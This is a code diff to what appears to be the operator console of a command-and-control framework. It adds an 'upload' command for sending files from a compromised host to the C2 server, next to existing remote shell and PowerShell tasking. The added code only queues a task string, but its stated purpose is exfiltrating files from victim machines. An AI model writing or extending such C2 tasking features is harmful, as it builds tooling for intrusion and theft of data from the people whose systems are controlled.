@@ -29,6 +29,7 @@ class Agent:
         
         self.menu.registerCommand("shell", "Execute a shell command.", "<command>")
         self.menu.registerCommand("powershell", "Execute a powershell command.", "<command>")
+        self.menu.registerCommand("upload", "Upload a file to the C2 server.", "<filepath>" )
         self.menu.registerCommand("sleep", "Change agent's sleep time.", "<time (s)>")
         self.menu.registerCommand("clear", "Clear tasks.", "")
         self.menu.registerCommand("quit", "Task agent to quit.", "")
@@ -92,6 +93,15 @@ class Agent:
             command = " ".join(args)
             task    = "powershell " + command
             self.writeTask(task)
+    
+    def upload(self, args):
+
+        if len(args) == 0:
+            error("Missing command.")
+        else:
+            command = " ".join(args)
+            task    = "upload " + command
+            self.writeTask(task)
 
     def sleep(self, args):
 
@@ -150,6 +160,8 @@ class Agent:
             self.shell(args)
         elif command == "powershell":
             self.powershell(args)
+        elif command == "upload":
+            self.upload(args)
         elif command == "sleep":
             self.sleep(args)
         elif command == "clear":
